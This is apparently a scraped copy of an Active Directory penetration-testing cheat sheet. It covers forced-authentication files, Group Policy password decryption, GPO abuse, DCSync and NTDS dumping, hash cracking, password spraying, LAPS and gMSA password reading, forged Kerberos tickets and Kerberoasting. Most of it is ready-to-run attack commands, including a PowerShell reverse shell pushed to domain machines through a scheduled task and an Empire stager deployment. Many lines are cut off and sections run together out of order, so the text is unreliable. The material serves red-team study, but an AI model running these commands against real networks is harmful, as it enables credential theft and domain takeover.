+Windows Library Files (.library-ms)
+# Farmer to receive auth
+farmer.exe <port> [seconds] [output]
+farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
+farmer.exe 8888 60 # one minute
+# Crop can be used to create various file types that will trigger SMB/WebDAV conn
+crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
+Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
+Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
+crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVE
+crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVE
+crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVE
+
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="<https://tinyurl.com/27fmkuxc">
+  <name>@windows.storage.dll,-34582</name>
+  <version>6</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>imageres.dll,-1003</iconReference>
+  <templateInfo>
+    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isSupported>false</isSupported>
+      <simpleLocation>
+        <url>\\\\workstation@8888\\folder</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+Windows Search Connectors Files
+Windows Search Connectors (.searchConnector-ms)
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="<https://tinyurl.com/28kdzply">
+    <iconReference>imageres.dll,-1002</iconReference>
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <iconReference>\\\\workstation@8888\\folder.ico</iconReference>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>\\\\workstation@8888\\folder</url>
+    </simpleLocation>
+</searchConnectorDescription>
+Passwords in SYSVOL & Group Policy Preferences
+Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to
+which all authenticated users have read access. All domain Group Policies are stored here: \\
+<DOMAIN>\SYSVOL\<DOMAIN>\Policies\ .
+
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0), using the 32-byte AES
+key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption
+Automate the SYSVOL and passwords research
+Metasploit  modules to enumerate shares and credentials
+scanner/smb/smb_enumshares
+post/windows/gather/enum_shares
+post/windows/gather/credentials/gpp
+CrackMapExec modules
+cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
+cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
+Get-GPPPassword
+Mitigations
+Install KB2962486 on every computer used to manage GPOs which prevents new
+credentials from being placed in Group Policy Preferences.
+echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fc
+e.g: 
+echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d 
+echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSV
+# with a NULL session
+Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+# with cleartext credentials
+Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+# pass-the-hash
+Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAI
+
+Delete existing GPP xml files in SYSVOL containing passwords.
+Don’t put passwords in files that are accessible by all authenticated users.
+Exploit Group Policy Objects GPO
+Creators of a GPO are automatically granted explicit Edit settings, delete, modify security,
+which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete,
+GenericRead, WriteDacl, WriteOwner
+:triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local
+GPO are stored in the DC in \\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\ ,
+inside two folders User and Machine. If you have the right to edit the GPO you can connect to
+the DC and replace the files. Planned Tasks are located at
+Machine\Preferences\ScheduledTasks .
+:warning: Domain members refresh group policy settings every 90 minutes with a random offset
+of 0 to 30 minutes but it can locally be forced with the following command: gpupdate /force .
+Find vulnerable GPO
+Look a GPLink where you have the Write right.
+Abuse GPO with SharpGPOAbuse
+Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_
+# Build and configure SharpGPOAbuse
+$ git clone https://tinyurl.com/2y2ql39c
+$ Install-Package CommandLineParser -Version 1.9.3.15
+$ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\C
+# Adding User Rights
+.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemo
+# Adding a Local Admin
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable
+# Configuring a User or Computer Logon Script
+.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptConten
+# Configuring a Computer or User Immediate Task
+# /!\ Intended to "run once" per GPO refresh, not run once per system
+
+Abuse GPO with PowerGPOAbuse
+https://tinyurl.com/2betvxc9
+Abuse GPO with pyGPOAbuse
+Abuse GPO with PowerView
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin -
+.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LO
+PS> . .\PowerGPOAbuse.ps1
+# Adding a localadmin 
+PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
+# Assign a new right 
+PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity '
+# Adding a New Computer/User script 
+PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(G
+# Create an immediate task 
+PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -Comma
+$ git clone https://tinyurl.com/2c2fwrwz
+# Add john user to local administrators group (Password: H4x00r123..)
+./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456
+# Reverse shell example
+./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456
+    -powershell \ 
+    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234
+    -taskname "Completely Legit Task" \
+    -description "Dis is legit, pliz no delete" \ 
+    -user
+# Enumerate GPO
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO
+New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArgument
+
+Abuse GPO with StandIn
+Dumping AD Domain Credentials
+You will need the following files to extract the ntds :
+NTDS.dit file
+SYSTEM hive ( C:\Windows\System32\SYSTEM )
+Usually you can find the ntds in two locations : systemroot\NTDS\ntds.dit  and
+systemroot\System32\ntds.dit .
+systemroot\NTDS\ntds.dit  stores the database that is in use on a domain controller. It
+contains the values for the domain and a replica of the values for the forest (the
+Configuration container data).
+systemroot\System32\ntds.dit  is the distribution copy of the default directory that is
+used when you install Active Directory on a server running Windows Server 2003 or later to
+create a domain controller. Because this file is available, you can run the Active Directory
+Installation Wizard without having to use the server operating system CD.
+However you can change the location to a custom one, you will need to query the registry to get
+the current location.
+DCSync Attack
+DCSync is a technique used by attackers to obtain sensitive information, including password
+hashes, from a domain controller in an Active Directory environment. Any member of
+Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer
+# Add a local administrator
+StandIn.exe --gpo --filter Shards --localadmin user002
+# Set custom right to a user
+StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivile
+# Execute a custom command
+StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "
+reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database
+
+accounts are able to run DCSync to pull password data.
+DCSync only one user
+mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
+DCSync all users of the domain
+mimikatz# lsadump::dcsync /domain:htb.local /all /csv
+crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
+crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
+:warning: OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync
+from a user account can raise alerts.
+Volume Shadow Copy
+The VSS is a Windows service that allows users to create snapshots or backups of their data at a
+specific point in time. Attackers can abuse this service to access and copy sensitive data, even if
+it is currently being used or locked by another process.
+windows-commands/vssadmin
+windows-commands/ntdsutil
+ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+CrackMapExec VSS module
+cme smb 10.10.0.202 -u username -p password --ntds vss
+Extract hashes from ntds.dit
+then you need to use secretsdump to extract the hashes, use the LOCAL  options to use it on a
+retrieved ntds.dit
+secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\S
+
+secretsdump also works remotely
+-pwd-last-set : Shows pwdLastSet attribute for each NTDS.DIT account.
+-user-status : Display whether or not the user is disabled.
+Using Mimikatz sekurlsa
+Dumps credential data in an Active Directory domain when run on a Domain Controller. :warning:
+Requires administrator access with debug or Local SYSTEM rights
+sekurlsa::krbtgt
+lsadump::lsa /inject /name:krbtgt
+Crack NTLM hashes with hashcat
+Useful when you want to have the clear text password or when you need to make stats about
+weak passwords.
+Recommended wordlists:
+Rockyou.txt
+Have I Been Pwned founds)
+Weakpass.com
+Read More at Methodology and Resources/Hash Cracking.md
+:warning: If the password is not a confidential data (challenges/ctf), you can use online "cracker"
+like :
+./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-s
+./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4
+# Basic wordlist
+# (-O) will Optimize for 32 characters or less passwords
+# (-w 4) will set the workload to "Insane" 
+$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r 
+# Generate a custom mask based on a wordlist
+$ git clone https://tinyurl.com/27a5ykbk
+$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
+$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.h
+
+hashmob.net
+crackstation.net
+hashes.com
+NTDS Reversible Encryption
+UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED  (0x00000080), if this bit is set, the password for this
+user stored encrypted in the directory - but in a reversible form.
+The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can
+be extracted by a domain admin. This means the hashes can be trivially reversed to the cleartext
+values, hence the term “reversible encryption”.
+List users with "Store passwords using reversible encryption" enabled
+The password retrieval is already handled by SecureAuthCorp/secretsdump.py and mimikatz, it
+will be displayed as CLEARTEXT.
+User Hunting
+Sometimes you need to find a machine where a specific user is logged in.
+You can remotely query every machines on the network to get a list of the users's sessions.
+CrackMapExec
+Impacket Smbclient
+$ impacket-smbclient Administrator@10.10.10.10
+# who
+host:  \\10.10.10.10, user: Administrator, active:     1, idle:     0
+PowerView Invoke-UserHunter
+# Find computers were a Domain Admin OR a specified user has a session
+Invoke-UserHunter
+Invoke-UserHunter -GroupName "RDPUsers"
+Invoke-UserHunter -Stealth
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountCont
+cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions
+SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [+] Enumerated sessions
+SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  \\10.10.10.10            Us
+
+Password spraying
+Password spraying refers to the attack method that takes a large number of usernames and
+loops them with a single password.
+The builtin Administrator account (RID:500) cannot be locked out of the system no matter
+how many failed logon attempts it accumulates.
+Most of the time the best passwords to spray are :
+P@ssw0rd01 , Password123 , Password1 , Hello123 , mimikatz
+Welcome1 / Welcome01
+$Companyname1 : $Microsoft1
+SeasonYear : Winter2019* , Spring2020! , Summer2018? , Summer2020 , July2020!
+Default AD password with simple mutations such as number-1, special character iteration
+(*,?,!,#)
+Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)
+Kerberos pre-auth bruteforcing
+Using kerbrute , a tool to perform Kerberos pre-auth bruteforcing.
+Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon
+failure event (4625), but rather with specific logs to Kerberos pre-authentication failure
+(4771).
+Username bruteforce
+Password bruteforce
+Password spray
+Spray a pre-generated passwords list
+root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 
+root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.1
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.1
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.1
+
+Using crackmapexec  and mp64  to generate passwords and spray them against SMB
+services on the network.
+Using DomainPasswordSpray  to spray a password against all users of a domain.
+Using SMBAutoBrute .
+Spray passwords against the RDP service
+Using RDPassSpray to target RDP services.
+Using hydra and ncrack to target RDP services.
+BadPwdCount attribute
+The number of times the user tried to log on to the account using an incorrect password. A
+value of 0 indicates that the value is unknown.
+Password in AD User comment
+crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+# https://tinyurl.com/2dgs7sa4
+Invoke-DomainPasswordSpray -Password Summer2021!
+# /!\ be careful with the account lockout !
+Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordL
+Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Passw
+git clone https://tinyurl.com/y5b629nh
+python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10
+ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp:/
+$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --u
+LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSe
+LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSe
+$ crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc
+$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M 
+
+There are 3-4 fields that seem to be common in most AD schemas: UserPassword ,
+UnixUserPassword , unicodePwd  and msSFU30Password .
+or dump the Active Directory and grep  the content.
+Password of Pre-Created Computer Account
+When Assign this computer account as a pre-Windows 2000 computer  checkmark is
+checked, the password for the computer account becomes the same as the computer account
+in lowercase. For instance, the computer account SERVERDEMO$ would have the password
+serverdemo.
+When you attempt to login using the credential you should have the following error code :
+STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT .
+Then you need to change the password with rpcchangepwd.py
+Reading LAPS Password
+Use LAPS to automatically manage local administrator passwords on domain joined
+computers so that passwords are unique on each managed computer, randomly generated,
+and securely stored in Active Directory infrastructure.
+Determine if LAPS is installed
+GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: 
+GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in acco
+GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribu
+enum4linux | grep -i desc
+Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabl
+ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
+# Create a machine with default password
+# must be run from a domain joined device connected to the domain
+djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEF
+
+Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
+Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
+Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
+Extract LAPS password
+The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS
+password. Confidential attributes can only be viewed by Domain Admins by default, and
+unlike other attributes, is not accessible by Authenticated Users
+From Windows:
+adsisearcher (native binary on Windows 8+)
+PowerView
+LAPSToolkit
+Powershell AdmPwd.PS
+From Linux:
+pyLAPS to read and write LAPS passwords:
+([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountNam
+([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountNam
+PS > Import-Module .\PowerView.ps1
+PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms
+$ Get-LAPSComputers
+ComputerName                Password                                 Expir
+------------                --------                                 -----
+example.domain.local        dbZu7;vGaI)Y6w1L                         02/21
+$ Find-LAPSDelegatedGroups
+$ Find-AdmPwdExtendedRights
+foreach ($objResult in $colResults){$objComputer = $objResult.Properties; 
+
+CrackMapExec:
+LAPSDumper
+ldapsearch
+Grant LAPS Access
+The members of the group "Account Operator" can add and modify all the non admin users and
+groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to
+add an user to them, and read the LAPS admin password
+Reading GMSA Password
+User accounts created to be used as service accounts rarely have their password changed.
+Group Managed Service Accounts (GMSAs) provide a better approach (starting in the
+Windows 2012 timeframe). The password is managed by AD and automatically rotated
+every 30 days to a randomly generated password of 256 bytes.
+GMSA Attributes in the Active Directory
+msDS-GroupMSAMembership  ( PrincipalsAllowedToRetrieveManagedPassword ) - stores
+the security principals that can access the GMSA password.
+# Read the password of all computers
+./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' 
+# Write a random password to a specific computer
+./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.loc
+crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586
+python laps.py -u 'user' -p 'password' -d 'domain.local'
+python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8f
+ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=com
+Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Do
+Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -D
+
+msds-ManagedPassword  - This attribute contains a BLOB with password information for
+group-managed service accounts.
+msDS-ManagedPasswordId  - This constructed attribute contains the key identifier for the
+current managed password data for a group MSA.
+msDS-ManagedPasswordInterval  - This attribute is used to retrieve the number of days
+before a managed password is automatically changed for a group MSA.
+Extract NT hash from the Active Directory
+GMSAPasswordReader (C#)
+# https://tinyurl.com/2yt5mdu6
+GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
+gMSADumper (Python)
+# https://tinyurl.com/27xutao6
+python3 gMSADumper.py -u User -p Password1 -d domain.local
+Active Directory Powershell
+gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module
+Forging Golden GMSA
+One notable difference between a Golden Ticket attack and the Golden GMSA attack is
+that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is
+compromised, there is no way to protect the gMSAs associated with it.
+:warning: You can't "force reset" a gMSA password, because a gMSA's password never
+changes. The password is derived from the KDS root key and
+ManagedPasswordIntervalInDays , so every Domain Controller can at any time compute what
+the password is, what it used to be, and what it will be at any point in the future.
+Using GoldenGMSA
+$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msD
+$blob = $gmsa.'msDS-ManagedPassword'
+$mp = ConvertFrom-ADManagedPasswordBlob $blob
+$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
+
+Kerberos Tickets
+Tickets are used to grant access to network resources. A ticket is a data structure that contains
+information about the user's identity, the network service or resource being accessed, and the
+permissions or privileges associated with that resource. Kerberos tickets have a limited lifetime
+and expire after a set period of time, typically 8 to 12 hours.
+There are two types of tickets in Kerberos:
+Ticket Granting Ticket (TGT): The TGT is obtained by the user during the initial
+authentication process. It is used to request additional service tickets without requiring the
+user to re-enter their credentials. The TGT contains the user's identity, a timestamp, and an
+encryption of the user's secret key.
+Service Ticket (ST): The service ticket is used to access a specific network service or
+resource. The user presents the service ticket to the service or resource, which then uses
+the ticket to authenticate the user and grant access to the requested resource. The service
+ticket contains the user's identity, a timestamp, and an encryption of the service's secret
+key.
+Dump Kerberos Tickets
+Mimikatz: sekurlsa::tickets /export
+Rubeus
+# List available tickets
+# Enumerate all gMSAs
+GoldenGMSA.exe gmsainfo
+# Query for a specific gMSA
+GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
+# Dump all KDS Root Keys
+GoldenGMSA.exe kdsinfo
+# Dump a specific KDS Root Key
+GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
+# Compute gMSA password
+# --sid <gMSA SID>: SID of the gMSA (required)
+# --kdskey <Base64-encoded blob>: Base64 encoded KDS Root Key
+# --pwdid <Base64-encoded blob>: Base64 of msds-ManagedPasswordID attribute va
+GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # 
+GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --
+GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --
+
+Rubeus.exe triage
+# Dump one ticket, the output is in Kirbi format
+Rubeus.exe dump /luid:0x12d1f7
+Replay Kerberos Tickets
+Mimikatz: mimikatz.exe "kerberos::ptc
+C:\temp\TGT_Administrator@lab.local.ccache"
+CrackMapExec: KRB5CCNAME=/tmp/administrator.ccache crackmapexec smb 10.10.10 -
+u user --use-kcache
+Convert Kerberos Tickets
+In the Kerberos authentication protocol, ccache and kirbi are two types of Kerberos credential
+caches that are used to store Kerberos tickets.
+A credential cache, or "ccache"  is a temporary storage area for Kerberos tickets that are
+obtained during the authentication process. The ccache contains the user's authentication
+credentials and is used to access network resources without having to re-enter the user's
+credentials for each request.
+The Kerberos Integrated Windows Authentication (KIWA) protocol used by Microsoft
+Windows systems also makes use of a credential cache called a "kirbi"  cache. The kirbi
+cache is similar to the ccache used by standard Kerberos implementations, but with some
+differences in the way it is structured and managed.
+While both caches serve the same basic purpose of storing Kerberos tickets to enable efficient
+access to network resources, they differ in format and structure. You can convert them easily
+using:
+kekeo: misc::convert ccache ticket.kirbi
+impacket: impacket-ticketConverter SRV01.kirbi SRV01.ccache
+Pass-the-Ticket Golden Tickets
+Forging a TGT require:
+the krbtgt  NT hash
+since recently, we cannot use a non-existent account name as a result of CVE-2021-42287
+mitigations
+The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main
+
+differences are that, in this case, no service SPN must be specified to ticketer.py, and the
+krbtgt NT hash must be used.
+Using Mimikatz
+Using Meterpreter
+Using a ticket on Linux
+# Get info - Mimikatz
+lsadump::lsa /inject /name:krbtgt
+lsadump::lsa /patch
+lsadump::trust /patch
+lsadump::dcsync /user:krbtgt
+# Forge a Golden ticket - Mimikatz
+kerberos::purge
+kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-201
+kerberos::tgt
+# Get info - Meterpreter(kiwi)
+dcsync_ntlm krbtgt
+dcsync krbtgt
+# Forge a Golden ticket - Meterpreter
+load kiwi
+golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID>
+golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914
+kerberos_ticket_purge
+kerberos_ticket_use /root/Downloads/pentestlabuser.tck
+kerberos_ticket_list
+# Convert the ticket kirbi to ccache with kekeo
+misc::convert ccache ticket.kirbi
+# Alternatively you can use ticketer from Impacket
+./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-29726
+ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator
+./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-35440
+export KRB5CCNAME=/home/user/ticket.ccache
+cat $KRB5CCNAME
+
+If you need to swap ticket between Windows and Linux, you need to convert them with
+ticket_converter  or kekeo .
+Mitigations:
+Hard to detect because they are legit TGT tickets
+Mimikatz generate a golden ticket with a life-span of 10 years
+Pass-the-Ticket Silver Tickets
+Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service
+account.
+Interesting services to target with a silver ticket :
+Service Type
+Service
+Silver
+Tickets
+Attack
+WMI
+HOST +
+RPCSS
+wmic.exe /authority:"kerberos:DOMAIN\DC01"
+/node:"DC01" process call create "cmd /c
+evil.exe"
+# NOTE: You may need to comment the proxy_dns setting in the proxychains configur
+./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache veloci
+Converting ccache => kirbi
+root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velocir
+Converting kirbi => ccache
+# Create a ticket for the service
+mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /t
+# Examples
+mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-14234559
+mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-134912
+# Then use the same steps as a Golden ticket
+mimikatz $ misc::convert ccache ticket.kirbi
+root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
+root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.1
+
+PowerShell
+Remoting
+CIFS +
+HTTP +
+(wsman?)
+New-PSSESSION -NAME PSC -ComputerName DC01;
+Enter-PSSession -Name PSC
+WinRM
+HTTP +
+wsman
+New-PSSESSION -NAME PSC -ComputerName DC01;
+Enter-PSSession -Name PSC
+Scheduled Tasks
+HOST
+schtasks /create /s dc01 /SC WEEKLY /RU "NT
+Authority\System" /IN "SCOM Agent Health Check"
+/IR "C:/shell.ps1"
+Windows File
+Share (CIFS)
+CIFS
+dir \\dc01\c$
+LDAP operations
+including Mimikatz
+DCSync
+LDAP
+lsadump::dcsync /dc:dc01 /domain:domain.local
+/user:krbtgt
+Windows Remote
+Server
+Administration
+Tools
+RPCSS +
+LDAP +
+CIFS
+/
+Mitigations:
+Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral
+movement with the generated ticket.
+Pass-the-Ticket Diamond Tickets
+Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt
+encryption key
+Require:
+krbtgt NT Hash
+krbtgt AES key
+ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password'
+Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTRO
+
+Pass-the-Ticket Sapphire Tickets
+Requesting the target user's PAC with S4U2self+U2U  exchange during TGS-REQ(P)
+(PKINIT).
+The goal is to mimic the PAC field as close as possible to a legitimate one.
+Require:
+Impacket PR#1411
+krbtgt AES key
+Kerberoasting
+"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used
+by Kerberos authentication to associate a service instance with a service logon account. " -
+MSDN
+Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket
+is received, password cracking can be done offline on the ticket to attempt to break the
+password for whatever user the service is running as.
+GetUserSPNs from Impacket Suite
+CrackMapExec Module
+# baduser argument will be ignored
+ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_
+$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+ServicePrincipalName  Name           MemberOf                                 
+--------------------  -------------  -----------------------------------------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,D
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84
+$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 
+LDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763
+LDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.lo
+
+Rubeus
+PowerView
+Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+bifrost on macOS machine
+targetedKerberoast
+Then crack the ticket using the correct hashcat mode ( $krb5tgs$23 = etype 23 )
+Mode
+Description
+13100
+Kerberos 5 TGS-REP etype 23 (RC4)
+19600
+Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)
+# Stats
+Rubeus.exe kerberoast /stats
+-------------------------------------   ----------------------------------
+| Supported Encryption Type | Count |  | Password Last Set Year | Count |
+-------------------------------------  ----------------------------------
+| RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
+-------------------------------------  ----------------------------------
+# Kerberoast (RC4 ticket)
